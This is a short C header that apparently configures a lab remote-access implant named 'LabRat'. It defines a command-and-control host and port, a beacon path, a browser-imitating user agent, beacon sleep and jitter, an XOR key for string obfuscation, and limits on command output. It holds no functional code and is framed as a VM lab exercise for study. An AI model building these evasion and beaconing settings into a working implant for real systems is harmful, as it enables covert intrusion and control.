#pragma once

/* Lab C2 — Win11 guest → host reachable from the VM (edit for your lab). */
#define C2_HOST "10.0.2.2"
#define C2_PORT 8080
#define BEACON_PATH "/beacon"
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) LabRat/0.5"

#define SLEEP_MS 3000
#define JITTER_PCT 25

/* XOR key for v0.5 string obfuscation (single-byte lab demo) */
#define XOR_KEY 0x5A

/* Max response / file chunk */
#define MAX_HTTP_RESP (512 * 1024)
#define MAX_CMD_OUT (64 * 1024)
#define MAX_PATH 260
